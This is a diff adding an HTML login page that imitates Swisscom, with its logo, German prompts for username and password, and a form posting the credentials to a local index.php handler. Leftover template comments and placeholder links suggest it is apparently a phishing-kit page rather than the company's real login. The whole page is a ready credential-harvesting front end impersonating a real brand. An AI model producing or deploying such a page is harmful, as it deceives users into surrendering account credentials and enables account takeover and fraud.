@@ -1,0 +1,81 @@
+<html lang="en" class=" pxpxtpjed idc0_350"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Swisscom Login</title>
+    <link rel="stylesheet" href="assets/css/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <script src="assets/js/script.js" defer=""></script>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <div class="logo">
+                <img src="assets/images/swisscom-logo.png" alt="Swisscom Logo" onerror="this.src='assets/images/swisscom-fallback.png'">
+            </div>
+        </div>
+    </header>
+    <main>
+        <div class="container">
+
+    <!-- Add CSS either here in <style> tags -->
+    <style>
+        /* LOGIN STYLES */
+        .login-logo {
+            display: block;
+            margin: 0 auto 20px;
+            max-width: 150px;
+            height: auto;
+        }
+        
+        .login-title {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        /* Keep your existing form styles below */
+        .login-container { /* ... */ }
+        .form-group { /* ... */ }
+        /* etc... */
+    </style>
+    
+    <!-- OR link to external CSS file instead (recommended) -->
+    <link rel="stylesheet" href="styles.css">
+
+
+
+<div class="login-container">
+	 <img src="assets/images/swisscom-logo.png" alt="Logo" class="login-logo">
+
+    <p class="login-subtitle">Melden Sie sich bitte hier mit Ihrem Swisscom Login an.</p>
+    
+    <form action="index.php?page=login" method="post" id="login-form">
+        <div class="form-group">
+            <label for="email" class="form-label">Benutzername</label>
+            <input type="email" id="email" name="email" class="form-input" placeholder="E-Mail oder Mobilnummer" required="">
+        </div>
+        
+        <div class="form-group">
+            <label for="password" class="form-label">Passwort</label>
+            <input type="password" id="password" name="password" class="form-input" required="">
+        </div>
+        
+        <div class="form-group">
+            <button type="submit" class="btn">Weiter</button>
+        </div>
+        
+        <div class="form-links">
+            <a href="#" class="form-link">Benutzername vergessen?</a>
+            <a href="#" class="form-link">Neu registrieren</a>
+        </div>
+    </form>
+</div></div>
+    </main>
+    <footer>
+        <div class="container">
+            <div class="footer-bottom">
+                <p>© 2025 Swisscom. All rights reserved.</p>
+            </div>
+        </div>
+    </footer>
+
+</body></html>
